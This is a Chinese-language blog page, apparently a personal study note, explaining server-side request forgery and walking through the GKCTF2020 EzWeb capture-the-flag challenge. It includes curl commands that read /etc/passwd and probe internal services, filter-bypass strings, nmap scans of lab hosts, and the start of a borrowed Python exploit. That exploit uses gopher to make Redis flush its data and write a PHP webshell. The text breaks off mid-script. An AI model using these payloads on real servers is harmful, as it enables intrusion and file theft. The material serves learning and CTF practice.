@@ -1,0 +1,644 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>SSRF学习 | upload</title><meta name="keywords" content="SSRF"><meta name="author" content="upload"><meta name="copyright" content="upload"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="SSRF   SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。很晦涩！！！举个例子：服务端有一个在线加载图片的功能，你传入一个图片URL，网站就会加载出来对应图片，所以图片的URL是网站服务器去访问的，如果我们利用这点传入一些只有服务端才能进行访问的URL，比如不对外开放的后台地址，那么这个过程就是服务端的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSRF学习">
+<meta property="og:url" content="http://upload.love/2021/01/25/SSRF%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="upload">
+<meta property="og:description" content="SSRF   SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。很晦涩！！！举个例子：服务端有一个在线加载图片的功能，你传入一个图片URL，网站就会加载出来对应图片，所以图片的URL是网站服务器去访问的，如果我们利用这点传入一些只有服务端才能进行访问的URL，比如不对外开放的后台地址，那么这个过程就是服务端的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://upload.love/image/236.jpg">
+<meta property="article:published_time" content="2021-01-25T08:43:09.000Z">
+<meta property="article:modified_time" content="2021-07-03T01:26:42.000Z">
+<meta property="article:author" content="upload">
+<meta property="article:tag" content="SSRF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://upload.love/image/236.jpg"><link rel="shortcut icon" href="/%E7%94%B7%E5%AD%A9.png"><link rel="canonical" href="http://upload.love/2021/01/25/SSRF%E5%AD%A6%E4%B9%A0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}
+
+// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
+const getScript = url => new Promise((resolve, reject) => {
+  const script = document.createElement('script')
+  script.src = url
+  script.async = true
+  script.onerror = reject
+  script.onload = script.onreadystatechange = function() {
+    const loadState = this.readyState
+    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+    script.onload = script.onreadystatechange = null
+    resolve()
+  }
+  document.head.appendChild(script)
+})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-07-03 09:26:42'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'true'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="upload" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" data-lazy-src="/image/pp.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">196</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">136</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">17</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> ♥♥♥</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/2.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">upload</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> ♥♥♥</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SSRF学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-01-25T08:43:09.000Z" title="发表于 2021-01-25 16:43:09">2021-01-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-07-03T01:26:42.000Z" title="更新于 2021-07-03 09:26:42">2021-07-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9%E5%AD%A6%E4%B9%A0/">知识点学习</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>14分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>   SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。很晦涩！！！举个例子：服务端有一个在线加载图片的功能，你传入一个图片URL，网站就会加载出来对应图片，所以图片的URL是网站服务器去访问的，如果我们利用这点传入一些只有服务端才能进行访问的URL，比如不对外开放的后台地址，那么这个过程就是服务端的请求伪造。</p>
+<p>简单的说就是：</p>
+<p>客户端把要请求的数据发给服务器！服务器来请求！这时我们可以构造发给服务器的数据！来获取服务器里的数据！等等。。。。。。</p>
+<h3 id="常简存在SSRF漏洞的函数"><a href="#常简存在SSRF漏洞的函数" class="headerlink" title="常简存在SSRF漏洞的函数"></a>常简存在SSRF漏洞的函数</h3><h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><p>1.file_get_contents()<br>2.fsockopen()<br>3.curl_exec() 默认不支持302跳转的</p>
+<h4 id="java"><a href="#java" class="headerlink" title="java"></a>java</h4><p>1.HttpClient<br>2.Request (对HttpClient封装后的类)<br>3.HttpURLConnection<br>4.URLConnection<br>5.URL<br>6.okhttp<br>以上的几个发送网络请求的类都有可能导致SSRF，但是java的各个类对协议的支持各有不同，所以利用过程首先得确定支持哪些协议。</p>
+<h3 id="SSRF支持的协议"><a href="#SSRF支持的协议" class="headerlink" title="SSRF支持的协议"></a>SSRF支持的协议</h3><p>这里协议描述的细一点，也参考了各个文章的trick。因为协议的技巧都是通用的，xxe、文件读取、文件包含等都可能用的上。</p>
+<table>
+<thead>
+<tr>
+<th>语言支持协议表</th>
+<th>php</th>
+<th>Java</th>
+<th>curl</th>
+<th>Perl</th>
+<th>ASP.NET</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>http/https</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+</tr>
+<tr>
+<td>gopher</td>
+<td>-with-curlwrappers</td>
+<td>Before JDK1.7</td>
+<td>before 7.49.0 不支持\x00</td>
+<td>√</td>
+<td>Before version 3</td>
+</tr>
+<tr>
+<td>tftp</td>
+<td>-with-curlwrappers</td>
+<td>X</td>
+<td>before 7.49.0 不支持\x00</td>
+<td>X</td>
+<td>X</td>
+</tr>
+<tr>
+<td>dict</td>
+<td>-with-curlwrappers</td>
+<td>X</td>
+<td>√</td>
+<td>X</td>
+<td>X</td>
+</tr>
+<tr>
+<td>file</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+</tr>
+<tr>
+<td>ftp</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+</tr>
+<tr>
+<td>imap</td>
+<td>-with-curlwrappers</td>
+<td>X</td>
+<td>√</td>
+<td>√</td>
+<td>X</td>
+</tr>
+<tr>
+<td>pop3</td>
+<td>-with-curlwrappers</td>
+<td>X</td>
+<td>√</td>
+<td>√</td>
+<td>X</td>
+</tr>
+<tr>
+<td>rtsp</td>
+<td>-with-curlwrappers</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+</tr>
+<tr>
+<td>smb</td>
+<td>-with-curlwrappers</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+<td>√</td>
+</tr>
+<tr>
+<td>smtp</td>
+<td>-with-curlwrappers</td>
+<td>X</td>
+<td>√</td>
+<td>X</td>
+<td>X</td>
+</tr>
+<tr>
+<td>telnet</td>
+<td>-with-curlwrappers</td>
+<td>X</td>
+<td>√</td>
+<td>X</td>
+<td>X</td>
+</tr>
+<tr>
+<td>ssh2</td>
+<td>受限于allow_url_fopen</td>
+<td>X</td>
+<td>X</td>
+<td>受限于NET:SSH2</td>
+<td>X</td>
+</tr>
+<tr>
+<td>ogg</td>
+<td>受限于allow_url_fopen</td>
+<td>X</td>
+<td>X</td>
+<td>X</td>
+<td>X</td>
+</tr>
+<tr>
+<td>expect</td>
+<td>受限于allow_url_fopen</td>
+<td>X</td>
+<td>X</td>
+<td>X</td>
+<td>X</td>
+</tr>
+<tr>
+<td>ldap</td>
+<td>X</td>
+<td>X</td>
+<td>X</td>
+<td>√</td>
+<td>X</td>
+</tr>
+<tr>
+<td>php</td>
+<td>√</td>
+<td>X</td>
+<td>X</td>
+<td>X</td>
+<td>X</td>
+</tr>
+<tr>
+<td>zlib/bzip/zip</td>
+<td>受限于allow_url_fopen</td>
+<td>X</td>
+<td>X</td>
+<td>X</td>
+<td>X</td>
+</tr>
+</tbody></table>
+<h1 id="各大协议"><a href="#各大协议" class="headerlink" title="各大协议"></a>各大协议</h1><h2 id="利用-Gopher-协议拓展攻击面"><a href="#利用-Gopher-协议拓展攻击面" class="headerlink" title="利用 Gopher 协议拓展攻击面"></a>利用 Gopher 协议拓展攻击面</h2><p>去长亭里看到一篇文章：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.chaitin.cn/gopher-attack-surfaces/">https://blog.chaitin.cn/gopher-attack-surfaces/</a></p>
+<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。当然现在 Gopher 协议已经慢慢淡出历史。<br>Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。</p>
+<h2 id="CGI、FCGI、php-cgi、php-fpm概念解析"><a href="#CGI、FCGI、php-cgi、php-fpm概念解析" class="headerlink" title="CGI、FCGI、php-cgi、php-fpm概念解析"></a>CGI、FCGI、php-cgi、php-fpm概念解析</h2><p><a target="_blank" rel="noopener" href="http://www.w3capi.com/doc/chapter/id/217/cid/21.html">http://www.w3capi.com/doc/chapter/id/217/cid/21.html</a></p>
+<p>我的理解把！CGI就是动态网页在发送给web服务器时！WEB服务器在请求相关后端服务(php服务)时，需要以什么样的格式、什么样的方式、发送给后端服务什么样的数据呢？在PHP执行环境中，其实是通过CGI进行处理的。CGI就是定义文件格式、数据内容的接口协议。！</p>
+<h1 id="学习文章"><a href="#学习文章" class="headerlink" title="学习文章"></a>学习文章</h1><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/226240">https://www.anquanke.com/post/id/226240</a></p>
+<p>tcl</p>
+<p>啥协议都不知道！</p>
+<p>不知道每个协议是干啥的！</p>
+<p>学学：</p>
+<h2 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h2><h3 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h3><p>读取服务器上任意文件内容</p>
+<h3 id="dict协议"><a href="#dict协议" class="headerlink" title="dict协议"></a>dict协议</h3><p>可以用来操作内网Redis等服务</p>
+<h3 id="ftp、ftps"><a href="#ftp、ftps" class="headerlink" title="ftp、ftps"></a>ftp、ftps</h3><p>FTP匿名访问、爆破</p>
+<h3 id="tftp"><a href="#tftp" class="headerlink" title="tftp"></a>tftp</h3><p>UDP协议扩展</p>
+<h3 id="imap-imaps-pop3-pop3s-smtp-smtps"><a href="#imap-imaps-pop3-pop3s-smtp-smtps" class="headerlink" title="imap/imaps/pop3/pop3s/smtp/smtps"></a>imap/imaps/pop3/pop3s/smtp/smtps</h3><p>爆破邮件用户名密码</p>
+<h3 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h3><p>SSH/Telnet匿名访问及爆破</p>
+<h3 id="smb-smbs"><a href="#smb-smbs" class="headerlink" title="smb/smbs"></a>smb/smbs</h3><p>SMB匿名访问及爆破</p>
+<h3 id="Gopher"><a href="#Gopher" class="headerlink" title="Gopher"></a>Gopher</h3><p>Gopher 协议在SSRF中属于万金油，可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求，还可以攻击内网未授权MySQL。</p>
+<p>Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。在ssrf时常常会用到gopher协议构造post包来攻击内网应用。其实构造方法很简单，与http协议很类似。<br>不同的点在于gopher协议没有默认端口，所以需要指定web端口，而且需要指定post方法。回车换行使用<code>%0d%a</code>。注意post参数之间的&amp;分隔符也要进行url编码<br>基本协议格式：<code>URL:gopher://:/_后接TCP数据流</code></p>
+<p>使用gopher协议构造post包的方法<br><a target="_blank" rel="noopener" href="https://www.th1s.cn/index.php/2016/10/31/15.html">https://www.th1s.cn/index.php/2016/10/31/15.html</a></p>
+<p>实际测试以及阅读文章中发现gopher存在以下几点问题</p>
+<ol>
+<li>PHP的curl默认不跟随302跳转</li>
+<li>curl7.43gopher协议存在%00截断的BUG，v7.45以上可用</li>
+<li>file_get_contents()的SSRF，gopher协议不能使用URLencode</li>
+<li>file_get_contents()的SSRF，gopher协议的302跳转有BUG会导致利用失败</li>
+</ol>
+<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h3 id="gopher、dict协议以及redis服务、Curl-命令"><a href="#gopher、dict协议以及redis服务、Curl-命令" class="headerlink" title="gopher、dict协议以及redis服务、Curl 命令"></a>gopher、dict协议以及redis服务、Curl 命令</h3><p><code>Gopher</code> 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 <code>FTP、Telnet、Redis、Memcache</code>，也可以进行 <code>GET、POST</code> 请求。</p>
+<p><code>DICT</code>协议,一个字典服务器协议,<code>A Dictionary Server Protocol</code>，允许客户端在使用过程中访问更多字典并且该协议约定服务器端侦听端口号:<code>2628</code>。</p>
+<p><code>redis</code>服务是在<code>6379</code>端口开启的<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200304115448-e48f2e66-5dcb-1.png"><img src= "/img/loading.gif" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20200304115448-e48f2e66-5dcb-1.png" alt="img"></a><br>这些我们大致了解一下知道其用处即可</p>
+<p><strong>curl</strong>命令在SSRF漏洞有非常重要的作用，所以这里就简单介绍一下<strong>curl</strong>命令：</p>
+<blockquote>
+<p>curl 是常用的命令行工具，用来请求 Web 服务器。它的名字就是客户端（client）的 URL 工具的意思</p>
+</blockquote>
+<p>不带有任何参数时，curl 就是发出 GET 请求</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ curl https:&#x2F;&#x2F;www.example.com</span><br></pre></td></tr></table></figure>
+
+<p>上面命令向<code>www.example.com</code>发出 GET 请求，服务器返回的内容会在命令行输出</p>
+<p><code>-v</code>参数输出通信的整个过程，用于调试。我们便可以利用<code>-v</code>参数进行读取文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用file协议curl -v file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br><span class="line">使用ftp协议 curl -v &quot;ftp:&#x2F;&#x2F;127.0.0.1:端口&#x2F;info&quot;</span><br><span class="line">使用dict协议 curl -v &quot;dict:&#x2F;&#x2F;127.0.0.1:端口&#x2F;info&quot;</span><br><span class="line">使用gopher协议 curl -v &quot;gopher:&#x2F;&#x2F;127.0.0.1:端口&#x2F;_info&quot;</span><br></pre></td></tr></table></figure>
+
+<p>其他参数可以参考<a target="_blank" rel="noopener" href="http://www.ruanyifeng.com/blog/2019/09/curl-reference.html">curl</a></p>
+<h3 id="常见内网IP段"><a href="#常见内网IP段" class="headerlink" title="常见内网IP段"></a>常见内网IP段</h3><p>局域网地址范围分三类，以下IP段为内网IP段：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C类：192.168.0.0 - 192.168.255.255 </span><br><span class="line"></span><br><span class="line">B类：172.16.0.0 - 172.31.255.255 </span><br><span class="line"></span><br><span class="line">A类：10.0.0.0 - 10.255.255.255</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="利用方法："><a href="#利用方法：" class="headerlink" title="利用方法："></a>利用方法：</h2><p>自己去看把！太多了！！！😶</p>
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h1 id="GKCTF2020-EZ三剑客-EzWeb"><a href="#GKCTF2020-EZ三剑客-EzWeb" class="headerlink" title="[GKCTF2020]EZ三剑客-EzWeb"></a>[GKCTF2020]EZ三剑客-EzWeb</h1><p>勉强学了点东西！</p>
+<p>以前遇到的ssrf都是file直接读！发现file没用了！感觉啥也不会了！</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210126102915.png" alt="image-20210125183150116"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210126102916.png" alt="image-20210125183210564"></p>
+<h2 id="访问-secret"><a href="#访问-secret" class="headerlink" title="访问?secret"></a>访问?secret</h2><p>发现执行了ifconfig</p>
+<p>发现内网的ip</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210126102917.png" alt="image-20210125183244235"></p>
+<p>大佬说给了ip，想想就知道是ssrf!😶</p>
+<p>我思考半天！在我的知识储备里，好像也就爆内网D段的时候用ip！好吧就可以认为是ssrf！</p>
+<p>🙄</p>
+<h2 id="file-读取文件"><a href="#file-读取文件" class="headerlink" title="file:读取文件"></a>file:读取文件</h2><p>发现file协议被过滤了，我们可以尝试绕过：<code>file：/</code>、<code>file:&lt;空格&gt;///</code></p>
+<p>file: //</p>
+<p>file:</p>
+<p>file: /</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params">$url</span>)</span>&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">echo</span> curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">		$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">		<span class="comment">//echo $url.&quot;\n&quot;;</span></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is&#x27;</span>, $url,$match))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//var_dump($match);</span></span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;别这样&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		curl($url);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;secret&#x27;</span>]))&#123;</span><br><span class="line">	system(<span class="string">&#x27;ifconfig&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>从源码中可知过滤了file协议、dict协议、127.0.0.1和localhost，但没有过滤http协议和gopher协议<br>我们使用http协议进行内网主机存活探测。用burp抓包，跑字典：</p>
+<p>一般实战的时候要对IP段进行探测！那字典 http</p>
+<p>端口进行探测！dict</p>
+<h2 id="爆内网ip和端口"><a href="#爆内网ip和端口" class="headerlink" title="爆内网ip和端口"></a>爆内网ip和端口</h2><p>进行D段扫描</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210126102918.png" alt="image-20210125190102166"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210126102919.png" alt="image-20210125190043272"></p>
+<p>爆出redis服务开启的</p>
+<p>6379</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210126102920.png" alt="image-20210125191727189"></p>
+<p>也可以用nmap:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sV 9969ab83-1446-441e-808a-02a5793215c5.node3.buuoj.cn -p 6379</span><br><span class="line">nmap -sV -F f29908c5-b09f-4a7a-8adb-e987183490be.node3.buuoj.cn</span><br><span class="line">nmap -sV f29908c5-b09f-4a7a-8adb-e987183490be.node3.buuoj.cn -T4</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="ssrf-打redis"><a href="#ssrf-打redis" class="headerlink" title="ssrf 打redis"></a>ssrf 打redis</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8613">https://xz.aliyun.com/t/8613</a></p>
+<h3 id="大佬的exp"><a href="#大佬的exp" class="headerlink" title="大佬的exp"></a>大佬的exp</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;173.96.119.11&quot;</span>      <span class="comment">// 运行有redis的主机ip</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php system(\&quot;cat /flag\&quot;);?&gt;\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">	 <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.format(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">	 <span 